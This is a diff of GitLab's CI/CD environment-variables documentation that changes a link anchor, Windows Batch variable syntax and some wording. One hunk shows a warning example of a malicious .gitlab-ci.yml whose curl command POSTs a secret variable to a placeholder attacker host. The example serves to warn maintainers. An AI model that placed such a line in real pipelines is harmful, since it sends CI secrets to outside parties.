@@ -1,7 +1,7 @@
 ---
 stage: Verify
 group: Continuous Integration
-info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#designated-technical-writers
+info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#assignments
 type: reference
 ---
 
@@ -142,7 +142,7 @@ Here is a simplified example of a malicious `.gitlab-ci.yml`:
 ```yaml
 build:
   script:
-    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
 ### Custom environment variables of type Variable
@@ -259,7 +259,7 @@ To access environment variables, use the syntax for your runner's [shell](https:
 |----------------------|------------------------------------------|
 | bash/sh              | `$variable`                              |
 | PowerShell           | `$env:variable` (primary) or `$variable` |
-| Windows Batch        | `%variable%`                             |
+| Windows Batch        | `%variable%`, or `!variable!` for [delayed expansion](https://ss64.com/nt/delayedexpansion.html), which can be used for variables that contain white spaces or newlines. |
 
 ### Bash
 
@@ -442,7 +442,7 @@ You can define instance-level variables via the UI or [API](../../api/instance_l
 
 To add an instance-level variable:
 
-1. Navigate to your admin area's **Settings > CI/CD** and expand the **Variables** section.
+1. Navigate to your Admin Area's **Settings > CI/CD** and expand the **Variables** section.
 1. Click the **Add variable** button, and fill in the details:
 
    - **Key**: Must be one line, using only letters, numbers, or `_` (underscore), with no spaces.
